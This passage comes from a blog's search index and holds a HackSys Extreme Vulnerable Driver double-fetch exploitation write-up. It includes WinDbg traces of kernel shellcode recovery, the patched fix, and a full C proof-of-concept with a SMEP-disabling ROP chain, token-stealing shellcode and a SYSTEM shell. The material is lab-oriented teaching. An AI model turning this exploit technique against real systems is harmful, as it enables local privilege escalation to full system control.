nt!KiSystemServiceCopyEnd+0x13\n0d 00000004`1d9ffa28 00007ffb`09722766     ntdll!NtDeviceIoControlFile+0x14\n0e 00000004`1d9ffa30 00007ff6`48e3a108     0x00007ffb`09722766\n0f 00000004`1d9ffa38 00000000`00000000     0x00007ff6`48e3a108\n\n1: kd&gt; r\nrax=ffffe4061dad7080 rbx=fffff802dfe93bf9 rcx=fffff909439dff90\nrdx=0000086540872a30 rsi=0000000000070678 rdi=fffff802dfb84f37\nrip=0000016e841b0056 rsp=fffff909439e07c0 rbp=ffffe4061d8fd6e0\n r8=0000000000000000  r9=0000000000000000 r10=0000000000000000\nr11=fffff909439e0790 r12=ffffe4061e001a00 r13=ffffe4061c6d0850\nr14=0000016e841b0000 r15=4141414141414141\n</code></pre> <p>What's pretty obvious here is that our stack is significantly corrupted. Our register state is not in a terrible state, but still needs some fixing. At this point we'll add another function to our shellcode called <code>KERNEL_RECOVERY</code> and we'll clean up some stuff following the execution of our shellcode.</p> <pre><code>KERNEL_RECOVERY:\n    xor rax, rax\n    xor rsi, rsi\n    ret\n</code></pre> <p>It is fairly obvious that we're not going to be able to return to anything such as <code>HEVD!DoubleFetchIoctlHandler+0x17</code> or <code>HEVD!IrpDeviceIoCtlHandler+0x26d</code> even if we could, we'll be missing the address of the IRP and these will eventually access violate when trying to dereference that address. If you remember from the last post we added 0x40 to RSP which based on the call stack above would return us to <code>fffff909439e0800</code> which is <code>nt!IofCallDriver+0x59</code>. Let's do the same here and add <code>0x40</code> to RSP.</p> <pre><code>1: kd&gt; bp nt!KiSetPageAttributesTable+0xc5\n\n1: kd&gt; g\nBreakpoint 0 hit\nnt!KiSetPageAttributesTable+0xc5:\nfffff801`42881bf9 59              pop     rcx\n1: kd&gt; p\nnt!KiSetPageAttributesTable+0xc6:\nfffff801`42881bfa c3              ret\n1: kd&gt; \nnt!KeFlushCurrentTbImmediately+0x17:\nfffff801`42572f37 0f22e1          mov     tmm,rcx\n\n1: kd&gt; \n00000270`b9140000 4150            push    r8\n1: kd&gt; \n00000270`b9140002 4151            push    r9\n1: kd&gt; \n00000270`b9140004 50              push    rax\n\n[...]\n\n1: kd&gt; \n00000270`b9140051 59              pop     rcx\n1: kd&gt; \n00000270`b9140052 4159            pop     r9\n1: kd&gt; \n00000270`b9140054 4158            pop     r8\n1: kd&gt; \n00000270`b9140056 4831c0          xor     rax,rax\n1: kd&gt; \n00000270`b9140059 4831f6          xor     rsi,rsi\n1: kd&gt; \n00000270`b914005c 4883c440        add     rsp,40h\n1: kd&gt; \n00000270`b9140060 c3              ret\n\n1: kd&gt; k\n # Child-SP          RetAddr               Call Site\n00 fffffb0e`e55c6800 ffffb780`07006180     0x00000270`b9140060\n01 fffffb0e`e55c6808 ffffb780`077dc380     0xffffb780`07006180\n02 fffffb0e`e55c6810 00000000`00000001     0xffffb780`077dc380\n03 fffffb0e`e55c6818 ffffb780`077dc380     0x1\n04 fffffb0e`e55c6820 ffffca00`0008e8c0     0xffffb780`077dc380\n05 fffffb0e`e55c6828 fffffb0e`e55c6940     0xffffca00`0008e8c0\n06 fffffb0e`e55c6830 ffffb780`077dc380     0xfffffb0e`e55c6940\n07 fffffb0e`e55c6838 fffff801`429a687b     0xffffb780`077dc380\n08 fffffb0e`e55c6840 fffff801`429aadea     nt!IopSynchronousServiceTail+0x1ab\n09 fffffb0e`e55c68f0 fffff801`429a87d6     nt!IopXxxControlFile+0x68a\n0a fffffb0e`e55c6a20 fffff801`425c4243     nt!NtDeviceIoControlFile+0x56\n0b fffffb0e`e55c6a90 00007ffa`85edaa84     nt!KiSystemServiceCopyEnd+0x13\n0c 000000c4`4e1ffb28 00007ffa`82fc2766     ntdll!NtDeviceIoControlFile+0x14\n0d 000000c4`4e1ffb30 00007ff7`c34aa108     0x00007ffa`82fc2766\n0e 000000c4`4e1ffb38 00000000`00000000     0x00007ff7`c34aa108\n\n1: kd&gt; r\nrax=0000000000000000 rbx=fffff80142881bf9 rcx=fffffb0ee55c5f90\nrdx=00000761d3bf8ba0 rsi=0000000000000000 rdi=fffff80142572f37\nrip=00000270b9140060 rsp=fffffb0ee55c6800 rbp=ffffb78007006180\n r8=0000000000000000  r9=0000000000000000 r10=0000000000000000\nr11=fffffb0ee55c6790 r12=ffffb780077dc380 r13=ffffb7800684da20\nr14=00000270b9140000 r15=4141414141414141\niopl=0         nv up ei ng nz na po nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286\n00000270`b9140060 c3              ret\n\n1: kd&gt; p\nffffb780`07006180 06              ???\n\n1: kd&gt; p\n\n*** Fatal System Error: 0x00000050\n                       (0xFFFFB78007006180,0x0000000000000011,0xFFFFB78007006180,0x000000000000000C)\n\n\nnt!DbgBreakPointWithStatus:\nfffff801`425bb810 cc              int     3\n</code></pre> <p>Okay great, an access violation. This frame seems to be corrupted. So what happens if we return to the frame before it at <code>RSP + 0x38</code> - lets try.</p> <pre><code>[...]\n\n1: kd&gt; \n000001ba`b7730060 c3              ret\n\n1: kd&gt; \nnt!IofCallDriver+0x59:\nfffff801`78cfd799 4883c438        add     rsp,38h\n1: kd&gt; \nnt!IofCallDriver+0x5d:\nfffff801`78cfd79d c3              ret\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x1ab:\nfffff801`7919d87b 448bf0          mov     r14d,eax\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x1ae:\nfffff801`7919d87e 4084f6          test    sil,sil\n1: kd&gt; p\nnt!IopSynchronousServiceTail+0x1b1:\nfffff801`7919d881 7508            jne     nt!IopSynchronousServiceTail+0x1bb (fffff801`7919d88b)\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x1b3:\nfffff801`7919d883 498bcc          mov     rcx,r12\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x1b6:\nfffff801`7919d886 e845c5b5ff      call    nt!ObDereferenceObjectDeferDelete (fffff801`78cf9dd0)\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x1bb:\nfffff801`7919d88b 4c8b642440      mov     r12,qword ptr [rsp+40h]\n\n[...]\n\n1: kd&gt; g\n*** Fatal System Error: 0x0000003b\n                       (0x00000000C0000005,0xFFFFF80178CF92A6,0xFFFF8F885D9DAD60,0x0000000000000000)\n\nnt!DbgBreakPointWithStatus:\nfffff801`78db2810 cc              int     3\n</code></pre> <p>At last, we have some progress! We still have an access violation but, we did briefly resume execution. Let's check out what caused it to fail.</p> <pre><code>1: kd&gt; \n00000178`eecb005c 4883c438        add     rsp,38h\n1: kd&gt; \n00000178`eecb0060 c3              ret\n\n1: kd&gt; \nnt!IofCallDriver+0x59:\nfffff803`add13799 4883c438        add     rsp,38h\n1: kd&gt; \nnt!IofCallDriver+0x5d:\nfffff803`add1379d c3              ret\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x1ab:\nfffff803`ae1b387b 448bf0          mov     r14d,eax\n\n[...]\n\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x2ea:\nfffff803`ae1b39ba 4c8d4c2438      lea     r9,[rsp+38h]\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x2ef:\nfffff803`ae1b39bf 4c8d442448      lea     r8,[rsp+48h]\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x2f4:\nfffff803`ae1b39c4 488d542450      lea     rdx,[rsp+50h]\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x2f9:\nfffff803`ae1b39c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff803`add0edc0)\n\n1: kd&gt; \n*** Fatal System Error: 0x0000003b\n                       (0x00000000C0000005,0xFFFFF803ADD0F2A6,0xFFFFF601F0891D60,0x0000000000000000)\n\nnt!DbgBreakPointWithStatus:\nfffff803`addc8810 cc              int     3\n</code></pre> <p>Okay, it looks like we couldn't complete our call at <code>nt!IopSynchronousServiceTail+0x2f9</code> which calls into <code>nt!IopCompleteRequest</code> and we can see before that call the registers <code>r9</code>, <code>r8</code> and <code>rdx</code> are used. Let's step into the call to <code>nt!IopCompleteRequest</code> now and see what happens.</p> <pre><code>1: kd&gt; t\nnt!IopSynchronousServiceTail+0x2f9:\nfffff801`4afa49c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff801`4aaffdc0)\n1: kd&gt; t\nnt!IopCompleteRequest:\nfffff801`4aaffdc0 4053            push    rbx\n\n[...]\n\n1: kd&gt; \nnt!IopCompleteRequest+0x8e:\nfffff801`4aaffe4e 4c8b7308        mov     r14,qword ptr [rbx+8]\n\n[...]\n\n1: kd&gt; \nnt!IopCompleteRequest+0x4e6:\nfffff801`4ab002a6 498b06          mov     rax,qword ptr [r14]\n1: kd&gt; \n\n*** Fatal System Error: 0x0000003b\n                       (0x00000000C0000005,0xFFFFF8014AB002A6,0xFFFF9C0FCDC8AD60,0x0000000000000000)\n\nnt!DbgBreakPointWithStatus:\nfffff801`4abb9810 cc              int     3\n\nCONTEXT:  ffff9c0fcdc8ad60 -- (.cxr 0xffff9c0fcdc8ad60)\nrax=00000000abeb090f rbx=fffff8014ae7fbf9 rcx=fffff8014ae7fc71\nrdx=ffff9c0fcdc8b890 rsi=ffffbd84ca586ef0 rdi=fffff8014ae7fc09\nrip=fffff8014ab002a6 rsp=ffff9c0fcdc8b750 rbp=ffffbd84c9d20800\n r8=ffff9c0fcdc8b888  r9=ffff9c0fcdc8b878 r10=0000000000000000\nr11=ffff9c0fcdc8b790 r12=0000000000000000 r13=ffffbd84ca586ef0\nr14=a6eb00000003bb92 r15=fffff8014ae55b00\niopl=0         nv up ei ng nz na pe nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010382\n\nnt!IopCompleteRequest+0x4e6:\nfffff801`4ab002a6 498b06          mov     rax,qword ptr [r14] ds:002b:a6eb0000`0003bb92=????????????????\n</code></pre> <p>Okay perfect, our access violation occurs on this <code>rax, qword ptr [r14]</code> instruction and we can see in the above that <code>r14</code> gets its value from <code>rbx + 0x8</code> so chances are that the address in <code>rbx + 0x8</code> has been corrupted, lets add a <code>mov rbx, r14</code> into our <code>KERNEL_RECOVERY</code> routine in our shellcode and see what happens.</p> <pre><code>[...]\n\n1: kd&gt; \n0000024a`d604005c 4883c438        add     rsp,38h\n1: kd&gt; \n0000024a`d6040060 4c89f3          mov     rbx,r14\n1: kd&gt; \n0000024a`d6040063 c3              ret\n\n1: kd&gt; \nnt!IofCallDriver+0x59:\nfffff803`a5113799 4883c438        add     rsp,38h\n1: kd&gt; \nnt!IofCallDriver+0x5d:\nfffff803`a511379d c3              ret\n\n\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x2f9:\nfffff803`a55b39c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff803`a510edc0)\n\n[...]\n\n1: kd&gt; \nnt!IopCompleteRequest+0x4de:\nfffff803`a510f29e c3              ret\n\n\n[...]\n\n1: kd&gt; \nnt!IopSynchronousServiceTail+0x2c6:\nfffff803`a55b3996 c3              ret\n\n[...]\n\n1: kd&gt; \nnt!NtDeviceIoControlFile+0x5a:\nfffff803`a55b57da c3              ret\n\n[...]\n\n1: kd&gt; \nnt!KiSystemServiceExit+0x1f0:\nfffff803`a51d143b 660fefdb        pxor    xmm3,xmm3\n\n1: kd&gt; g\n</code></pre> <p>And as we can see from the above, the fact we didn't get an access violation suggests that fix has worked, and if we wait a while our exploit finishes and see this....</p> SYSTEM shell :)<pre><code>[+] HEVD: Double Fetch\n[*] Opening handle to driver!\n        [+] Opened Driver Handle: 0x94\n[*] Running exploit function!\n        [+] Allocated user buffer!\n[+] Obtaining Driver Base Address!\n[*] Driver base name is: ntoskrnl.exe\n[*] ntoskrnl.exe is located at: 0xfffff803a5016000\n[+] Shellcode allocated at: 0x0000024ad6040000\n        [+] Opened thread for changing size 160\n        [+] Set ChangeSizeThread Priority to 15\n        [+] Opened thread for IOCTL Control 164\n        [+] Set IoControlThread Priority to 15\n        [+] Set Affinity Mask for target threads!\n[+] Sending IOCTL on processor 1\n        [+] Opened thread for changing size 168\n        [+] Changing size on processor 0\n[!] FATAL: Unable to send IOCTL to driver!\n[!] FATAL: Unable to send IOCTL to driver!\n[!] FATAL: Unable to send IOCTL to driver!\n[!] FATAL: Unable to send IOCTL to driver!\n[!] FATAL: Unable to send IOCTL to driver!\n        [+] Set ChangeSizeThread Priority to 15\n        [+] Opened thread for IOCTL Control 172\n        [+] Set IoControlThread Priority to 15\n        [+] Set Affinity Mask for target threads!\n        [+] Changing size on processor 1\n[+] Sending IOCTL on processor 1\nMicrosoft Windows [Version 10.0.17134.1246]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\admin\\Desktop&gt;whoami\nnt authority\\system\n</code></pre> <p>Meaning our shellcode did work and we successfully got kernel continuation! I should note that this section does not put into perspective just how long this part took. Shellcoding is my least favourite part of this job (mostly because I am awful at it) but especially when it comes to process continuation. It is extremely frustrating and time consuming - but stick with it. I learned a ton from this!</p>","title":"Shellcode"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#fix","tags":["windows-kernel-exploitation"],"text":"<p>In the interest of completeness I thought it would be worthwhile documenting the fix for these vulnerabilities. We can open up the patched HEVD in IDA and take a look at this function again. Below is a cleaned up and simplified output from the patched version of HEVD.</p> Fixed Code<pre><code>TriggerDoubleFetch(*UserDoubleFetch)\n{\n  char      UserDoubleFetchBuffer;\n  size_t    UserDoubleFetchSize;\n  char      KernelBuffer[2048];\n\n  memset(KernelBuffer, 0, 2048);\n  ProbeForRead(UserDoubleFetch, 0x10, 1);\n\n  UserDoubleFetchBuffer = UserDoubleFetch;\n  UserDoubleFetchSize = UserDoubleFetch + 1;\n  DbgPrintEx(0x4D, 3, \"[+] UserDoubleFetch-&gt;Buffer: 0x%p\\n\", UserDoubleFetchBuffer);\n  DbgPrintEx(0x4D, 3, \"[+] UserDoubleFetch-&gt;Size: 0x%X\\n\", UserDoubleFetchSize);\n\n  if ( UserDoubleFetchSize &lt;= 0x800 )\n  {\n    RtlCopyMemory(KernelBuffer, UserDoubleFetchBuffer, UserDoubleFetchSize);\n  }\n\n}\n</code></pre> <p>Focusing only on the important parts, we can see very clearly where the fix is. Instead of doing a fetch for the size check and then a fetch again in the call to <code>RtlCopyMemory</code>, the buffer and size values are fetched once before the print statements and those values are used throughout including for the size check and the copy.</p>","title":"Fix"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#full-exploit","tags":["windows-kernel-exploitation"],"text":"<p>Thanks for reading, I hope you enjoyed! You can find my full proof of concept below.</p> <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;processthreadsapi.h&gt;\n#include &lt;Psapi.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x222037\n\n/* Structure for the user-mode buffer */\ntypedef struct _USER_DOUBLE_FETCH\n{\n    LPVOID  Buffer;\n    SIZE_T  Size;\n} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;\n\n/* Structure for needed data in IoControlThread function */\ntypedef struct _IO_THREAD_PARAM\n{\n    HANDLE              DriverHandle;\n    PUSER_DOUBLE_FETCH  DoubleFetch;    // This member is a pointer to the _USER_DOUBLE_FETCH structure\n} IO_THREAD_PARAM, *PIO_THREAD_PARAM;\n\n/* Function to open a handle to the driver */\nHANDLE OpenDriverHandle(void)\n{\n    HANDLE DriverHandle = NULL;\n\n    /* Opens handle to driver */\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.\n    {\n        printf(\"\\t[!] FATAL: Failed to open driver handle!\\n\");\n        exit(-1);\n    }\n    else\n    {\n        printf(\"\\t[+] Opened Driver Handle: 0x%x\\n\", DriverHandle);\n        return DriverHandle; // Return handle to driver to be used later.\n    }\n}\n\n/* Function to check how many processors we have */\nint CheckProcessors(void)\n{\n    SYSTEM_INFO SystemInfo = { 0 };\n\n    /* Check if we have more than 4 processors as attack will take too otherwise */\n    GetSystemInfo(&amp;SystemInfo);\n    if (SystemInfo.dwNumberOfProcessors &lt; 2)\n    {\n        printf(\"[!] FATAL: You don't have enough processors, exiting!\\n\");\n        exit(-1);\n    }\n\n    int NumProcessors = SystemInfo.dwNumberOfProcessors;\n    return NumProcessors; /* Return number of processors available to be used later. */\n}\n\n/* Function to change the size member of the UserDoubleFetch struct */\nDWORD WINAPI ChangeSizeThread(LPVOID Size)\n{\n    BOOL ExploitSuccess;\n    int i = 0;\n\n    printf(\"\\t[+] Changing size on processor %d\\n\", GetCurrentProcessorNumber());\n\n    // Run until we get control of RIP.\n    while (!ExploitSuccess)\n    {\n        *(PULONG)Size ^= 0x00000828; // 2088\n    }\n\n    return EXIT_SUCCESS;\n}\n\n/* Function to issue IOCTL repeatedly */\nDWORD WINAPI IoControlThread(LPVOID IoThreadParam)\n{\n\n    BOOL ExploitSuccess;\n\n    PIO_THREAD_PARAM IoControlThreadParam = NULL;\n    HANDLE DriverHandle = NULL;\n    PUSER_DOUBLE_FETCH UserDoubleFetch = NULL;\n\n    DWORD   BytesReturned = 0;\n    int     i = 0;\n\n    printf(\"[+] Sending IOCTL on processor %d\\n\", GetCurrentProcessorNumber());\n\n    /* Get pointer to _IO_THREAD_PARAM struct */\n    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;\n\n    /* Get DoubleFetch member from _IO_THREAD_PARAM struct */\n    UserDoubleFetch = IoControlThreadParam-&gt;DoubleFetch;\n\n    /* Get DriverHandle member from _IO_THREAD_PARAM struct */\n    DriverHandle = IoControlThreadParam-&gt;DriverHandle;\n    printf(\"%d\", DriverHandle);\n\n    /* Run until we get control of RIP. */\n    while (!ExploitSuccess)\n    {\n        EmptyWorkingSet(GetCurrentProcess());\n\n        if (!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &amp;BytesReturned, NULL))\n        {\n            printf(\"[!] FATAL: Unable to send IOCTL to driver!\\n\");\n        }\n    }\n\n    return EXIT_SUCCESS;\n}\n\nunsigned long long GetKernelBase(void)\n{\n\n    LPVOID  lpImageBase[1024];\n    DWORD   lpcbNeeded;\n\n    /* Get base address of first driver (ntoskrnl.exe) */\n    printf(\"[+] Obtaining Driver Base Address!\\n\");\n    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &amp;lpcbNeeded);\n    if (!DriversBase)\n    {\n        printf(\"[!] FATAL: Error enumerating device drivers!\\n\");\n        exit(1);\n    }\n\n    /* Get name of first driver (ntoskrnl.exe) */\n    char BaseName[1024] = { 0 };\n    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));\n    if (!DriversBaseName)\n    {\n        printf(\"[!] FATAL: Error getting drivers base name!\\n\");\n        exit(1);\n    }\n\n    /*\n     * ntoskrnl.exe is the first module in lpImageBase.\n     * typecast LPVOID -&gt; unsigned long long\n    */\n    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];\n\n    printf(\"[*] Driver base name is: %s\\n\", BaseName);\n    printf(\"[*] %s is located at: 0x%p\\n\", BaseName, KernelBase);\n\n    return KernelBase;\n\n}\n\nunsigned long long CreateShellcode(void)\n{\n\n    char payload[] = \"\\x41\\x50\\x41\\x51\\x50\\x65\\x4C\\x8B\\x04\\x25\\x88\\x01\\x00\\x00\\x41\\xC7\\x80\\xE4\"\n                     \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x4D\\x8B\\x88\\xB8\\x00\\x00\\x00\\x4C\\x89\\xC8\\x49\"\n                     \"\\x8B\\x89\\xE0\\x02\\x00\\x00\\x48\\x83\\xF9\\x04\\x74\\x10\\x4D\\x8B\\x89\\xE8\\x02\\x00\"\n                     \"\\x00\\x49\\x81\\xE9\\xE8\\x02\\x00\\x00\\xEB\\xE3\\x49\\x8B\\x89\\x58\\x03\\x00\\x00\\x80\"\n                     \"\\xE1\\xF0\\x48\\x89\\x88\\x58\\x03\\x00\\x00\\x59\\x41\\x59\\x41\\x58\\x48\\x31\\xC0\\x48\"\n                     \"\\x31\\xF6\\x48\\x83\\xC4\\x38\\x4c\\x89\\xf3\\xC3\";\n\n\n    /* Allocate shellcode in user mode */\n    LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), 0x3000, 0x40);\n    if (!shellcode)\n    {\n        printf(\"[-] FATAL: Unable to allocate shellcode!\\n\");\n        exit(1);\n    }\n    printf(\"[+] Shellcode allocated at: 0x%p\\n\", shellcode);\n\n    /* Move allocated space in user mode */\n    BOOL MoveMem = RtlMoveMemory(shellcode, payload, sizeof(payload));\n    if (!MoveMem)\n    {\n        printf(\"[-] FATAL: Unable to move shellcode into allocated memory!\\n\");\n    }\n\n    unsigned long long ShellcodeBase = (unsigned long long)shellcode;\n    return ShellcodeBase;\n}\n\nDWORD WINAPI exploit(LPVOID DriverHandle)\n{\n\n    LPVOID  UserBuffer = { 0 };\n    SIZE_T  UserBufferSize = 2096; // Offset for RIP control is at 2056.\n    BOOL    ExploitSuccess;\n\n    HANDLE ChangeSizeThreads[100] = { 0 };\n    HANDLE IoControlThreads[100] = { 0 };\n\n    PIO_THREAD_PARAM IoThreadParam = NULL;\n\n    HANDLE ExploitThread = CreateThread(NULL, NULL, exploit, DriverHandle, CREATE_SUSPENDED, NULL);\n\n    /* return number of processors */\n    int NumProcessors = CheckProcessors();\n\n    /* Allocate USER_DOUBLE_FETCH struct */\n    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);\n    if (!PtrUserDoubleFetch)\n    {\n        printf(\"[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\\n\");\n        return;\n    }\n\n    /* Allocate USER_DOUBLE_FETCH members */\n    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);\n    if (!UserBuffer)\n    {\n        printf(\"[!] FATAL: Failed to allocate heap buffer!\\n\");\n        return;\n    }\n    printf(\"\\t[+] Allocated user buffer!\\n\");\n\n    /* Initialize USER_DOUBLE_FETCH struct members */\n    PtrUserDoubleFetch-&gt;Buffer = UserBuffer;\n    PtrUserDoubleFetch-&gt;Size = 100;\n\n    unsigned long long BaseAddress = GetKernelBase();\n    unsigned long long ShellcodeAddress = CreateShellcode();\n\n    unsigned long long ROP0 = BaseAddress + 0x4eaf14;       // mov rax, rcx ; ret\n    unsigned long long ROP1 = BaseAddress + 0x478bf9;       // pop rcx ; ret\n    unsigned long long ROP2 = 0x70678;                      // Disable SMEP\n    unsigned long long ROP3 = BaseAddress + 0x169f37;       // mov cr4, rcx ; ret \n\n    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);        // Fill buffer with junk till RIP\n    RtlCopyMemory(&amp;UserBuffer[2056], &amp;ROP0, 0x8);           // mov rax, rcx ; ret\n    RtlCopyMemory(&amp;UserBuffer[2056 + 8], &amp;ROP1, 0x8);       // pop rcx\n    RtlCopyMemory(&amp;UserBuffer[2056 + 16], &amp;ROP2, 0x8);      // SMEP Disable Value\n    RtlCopyMemory(&amp;UserBuffer[2056 + 24], &amp;ROP3, 0x8);      // Update CR4 \n    RtlCopyMemory(&amp;UserBuffer[2056 + 32], &amp;ShellcodeAddress, 0x8);\n\n\n    /* Allocate IO_THREAD_PARAM struct */\n    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));\n    if (!IoThreadParam)\n    {\n        printf(\"[!] FATAL: Failed to allocate memory for IO thread!\\n\");\n        return;\n    }\n\n    /* Initialise IO_THREAD_PARAM struct members */\n    IoThreadParam-&gt;DriverHandle = DriverHandle;\n    IoThreadParam-&gt;DoubleFetch = PtrUserDoubleFetch;\n\n    ExploitSuccess = FALSE;\n\n    for (int i = 0; i &lt; NumProcessors; i++)\n    {\n        ChangeSizeThreads[i] = CreateThread(NULL, NULL, ChangeSizeThread, &amp;PtrUserDoubleFetch-&gt;Size, CREATE_SUSPENDED, NULL);\n        printf(\"\\t[+] Opened thread for changing size %d\\n\", ChangeSizeThreads[i]);\n        SetThreadPriority(ChangeSizeThreads[i], THREAD_PRIORITY_TIME_CRITICAL);\n        printf(\"\\t[+] Set ChangeSizeThread Priority to %d\\n\", GetThreadPriority(ChangeSizeThreads[i]));\n\n        IoControlThreads[i] = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);\n        printf(\"\\t[+] Opened thread for IOCTL Control %d\\n\", IoControlThreads[i]);\n        SetThreadPriority(IoControlThreads[i], THREAD_PRIORITY_TIME_CRITICAL);\n        printf(\"\\t[+] Set IoControlThread Priority to %d\\n\", GetThreadPriority(IoControlThreads[i]));\n\n        SetThreadAffinityMask(ChangeSizeThreads[i], 1 &lt;&lt; i);\n        SetThreadAffinityMask(IoControlThreads[i], 1 &lt;&lt; i + 1);\n        printf(\"\\t[+] Set Affinity Mask for target threads!\\n\");\n\n        ResumeThread(ChangeSizeThreads[i]);\n        ResumeThread(IoControlThreads[i]);\n    }\n\n    int i = 0;\n    if (WaitForMultipleObjects(NumProcessors, ChangeSizeThreads, TRUE, 120000))\n    {\n        for (i = 0; i &lt; NumProcessors; i++)\n        {\n            TerminateThread(ChangeSizeThreads[i], EXIT_SUCCESS);\n            CloseHandle(ChangeSizeThreads[i]);\n\n            TerminateThread(IoControlThreads[i], EXIT_SUCCESS);\n            CloseHandle(IoControlThreads[i]);\n        }\n    }\n\n    system(\"cmd.exe\");\n    printf(\"[*] 1337 System Shell Bozo\");\n\n}\n\nint main()\n{\n    printf(\"[+] HEVD: Double Fetch\\n\");\n\n    printf(\"[*] Opening handle to driver!\\n\");\n    HANDLE DriverHandle = OpenDriverHandle();\n\n    printf(\"[*] Running exploit function!\\n\");\n\n    exploit(DriverHandle);\n\n}\n</code></pre> <p>Exploit on  </p>","title":"Full Exploit"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#acknowledgements","tags":["windows-kernel-exploitation"],"text":"<p>I would like to sincerely thank Connor for helping me and listening to my stupid ideas. I highly recommend you check out his much more technically complex blog. Thanks Connor!</p> <p>Thanks for reading! I am going to go and get my POC working on RS1 now :p</p>","title":"Acknowledgements"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#references","tags":["windows-kernel-exploitation"],"text":"<ul> <li>[1] - https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/</li> <li>[2] - https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/</li> <li>[3] - https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c</li> <li>[4] - https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c</li> <li>[5] - https://stackoverflow.com/questions/494163/what-is-pvoid-data-type</li> <li>[6] - https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf</li> <li>[7] - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber</li> <li>[8] - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority</li> <li>[9] - https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask</li> <li>[10] - https://stackoverflow.com/a/5919745</li> <li>[11] - https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/</li> </ul>","title":"References"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/","tags":["windows-kernel-exploitation"],"text":"","title":"HackSys Extreme Vulnerable Driver 3 - Memory Disclosure"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#introduction","tags":["windows-kernel-exploitation"],"text":"<p>Over the next few posts we're going to heavily focus on the pool, as a result this post serves two purposes. The first purpose is to ascertain a basic understanding of the \"Pool\" prior to Windows RS5 (LFH) and the second is to get familiar with the pool under the direction of an exploit.</p> <p>This post is a writeup of a NonPaged Pool Memory Disclosure in HackSys Extreme Vulnerable driver - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:</p> <ul> <li>Windows 10 Pro x64 RS4</li> <li>HEVD 3.00</li> </ul> <p>If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.</p> <p>If you have not read my previous posts on HackSys Extreme Vulnerable Driver then I'd highly recommend you do so. Although the vulnerabilities there are not particularly related to this post, if you're newer to kernel exploitation specifically on Windows then the previous posts will be useful particularly the classic stack buffer overflow.</p>","title":"Introduction"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#nonpaged-pool-memory-disclosure","tags":["windows-kernel-exploitation"],"text":"<p>In this post we're going to explore a memory disclosure primitive in a function which allocates on the NonPaged Pool. Although the primitive itself is fairly simple it will give us the context required to go further with exploiting more complex primitives featuring the pool in future posts. In short, this post serves as a foundation for developing an understanding of the Windows Pool pre-LFH.</p>  Note <p>In later posts we will explore this content again in a post-LFH world. Although pre-LFH is not as relevant now, it serves as a great foundation. I wanted the content to remain semi-relevant to real-life hence why we're on Windows 10 x64 and not x86.</p>","title":"NonPaged Pool Memory Disclosure"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#memory-pool","tags":["windows-kernel-exploitation"],"text":"<p>The \"Pool\" is the heap reserved specifically for kernel-land on Windows, i.e, its a fancy term for the kernels heap. In previous releases of Windows the Pool allocator has been specific and different from the allocator 